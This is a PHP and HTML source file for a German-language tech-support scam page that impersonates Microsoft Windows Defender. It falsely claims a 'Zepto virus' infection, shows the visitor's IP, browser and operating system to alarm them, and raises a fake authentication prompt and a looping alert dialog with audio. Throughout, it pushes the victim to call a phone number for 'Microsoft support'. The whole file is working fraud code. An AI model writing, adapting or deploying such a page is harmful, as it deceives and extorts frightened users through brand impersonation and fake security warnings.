<?php
header('WWW-Authenticate: Basic realm="Windows-Warnmeldung :Zepto-Virus in Ihrer Systemregistrierung erkannt . RUFEN Sie Microsoft Techniker +4932221097517 zur kostenlosen Überprüfung an"'); 
header("HTTP/1.1 401 Unauthorized"); 
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="icon" href="https://www.microsoft.com/favicon.ico?v2" type="image/gif" sizes="16x16">
<title>System Under Attack  !!</title>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-153417081-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-153417081-1');
</script>

<style>
.microsoft {
    background-color: #f25022;
    box-shadow: 
        95px 0 0 0 #7fba00, 
        0 95px 0 0 #00a4ef, 
        95px 95px 0 0 #ffb900;
    height: 90px;
    width: 90px;
}
</style>
</head>

<body bgcolor="#0099FF" style="font-family: 'Segoe UI', Frutiger, 'Frutiger Linotype', 'Dejavu Sans', 'Helvetica Neue', Arial, sans-serif;;">
<div style="width:1100px; margin:auto; height:90%;color:#F00; z-index:800;">

<h1 style=" font-size:40px;">Windows Defender-Warnung :  Fehler Code # 0x3e7 </h1>

<div style="width:65%; float:left;border-right:1px solid #999;">
<h2 style="font-size:20px;">Bitte fahren Sie Ihren Computer nicht herunter oder setzen Sie ihn nicht zurück .</h2> 
<br/>
<br/>
<h2 style="color:#F00; font-size:29px;">**Windows-Warnmeldung **</h2> 
<p>
<b>Zepto-Virus in Ihrer Systemregistrierung erkannt . </b>
<br/><br/>Sehr geehrter Windows-Benutzer, die Website, die Sie kürzlich besucht haben, hat möglicherweise die Malware und den Virus auf Ihr Windows-System heruntergeladen. 
Windows Defender ist in Bezug auf Ihre Windows-Systemsicherheit verdächtig. Versuchen Sie nicht, Ihren Computer herunterzufahren oder neu zu starten. Möglicherweise wird Ihr Computer dauerhaft gesperrt oder Ihre Festplatte gelöscht . 
Ihre TCP-Verbindung wurde von Ihrem Windows-Sicherheitssystem blockiert. Ihre Windows- und Internetverbindung wurde gesperrt, bis wir möglicherweise von Ihnen hören, um dieses Problem sofort zu beheben.
</p>
<div style="margin-top:30px; font-size:25px; font-weight:bold;">Rufen Sie den technischen Support an<br/>Sofort unter der Telefonnummer +4932221097517    </div>
</div>
<div  style="float:left; width:25%; margin-top:2%;  height:300px; margin-left:2%;">
<div class="microsoft"></div>
<br /><br /><br /><br /><br />
<div style="font-size: 30px; font-weight:bold; font-style: normal; font-variant: normal;font-weight: 500;line-height: 26.4px;">Microsoft Windows <br/>Defender </div>
<div style="font-size: 15px; font-weight:bold; font-style: normal; font-variant: normal;font-weight: 500;line-height: 26.4px; margin-top:20px;">
System Informations <hr/>
IP : <?php echo $realip;?> <br/>
Browser : <?php echo $browser;?><br/>
Operating System : <?php echo $user_os ;?><br/>
<div style="position:fixed; bottom:0px; right:0px; height:100px; min-width:475px; background-color:#e4f0fb; z-index:2000;-moz-border-radius: 3px;
    -webkit-border-radius: 3px;
    -khtml-border-radius: 3px;
    border-radius: 3px;">
    <div style="width:100%; height:30px; border-bottom:1px solid #CCC; padding-left:10px;"> Benutzerauthentifizierung erforderlich: Rufen Sie jetzt den technischen Support von Microsoft an </div>
    <div style="width:100%; height:60px; text-align:center; font-size:50px; font-weight:bolder; padding-top:15px; "> +4932221097517    </div>

</div>
</div>
</div>
</div>
<audio autoplay="autoplay" loop="">
  <source src="err.mp3" type="audio/mpeg">
</audio>

<?php
if (($browser!="Edge") and ($browser!="Firefox"))
{?> 
   
<script type="text/javascript">

window.confirm("**Windows Defender-Warnung ** \n\n Sehr geehrter Windows-Benutzer, die Website, die Sie kürzlich besucht haben, hat möglicherweise die Malware und den Virus auf Ihr Windows-System heruntergeladen. Windows Defender ist in Bezug auf Ihre Windows-Systemsicherheit verdächtig. Versuchen Sie nicht, Ihren Computer herunterzufahren oder neu zu starten. Rufen Sie sofort den technischen Support von Microsoft Windows unter +4932221097517 an    . \n\n Möglicherweise wird Ihr Computer dauerhaft gesperrt oder Ihre Festplatte gelöscht. \n\n\n Rufen Sie sofort den technischen Support von Microsoft Windows unter +4932221097517 an   .\n\n Ihre TCP-Verbindung wurde von Ihrem Windows-Sicherheitssystem blockiert. Ihre Windows- und Internetverbindung wurde gesperrt, bis wir möglicherweise von Ihnen hören, um dieses Problem sofort zu beheben.\n\n Rufen Sie sofort den technischen Support von Microsoft Windows unter +4932221097517 an    .\n\n");

</script>

<?php
}
?>
</body>
</html>

<?php

echo '<script type="text/javascript">window.location="indexxxx.php";</script>';

?>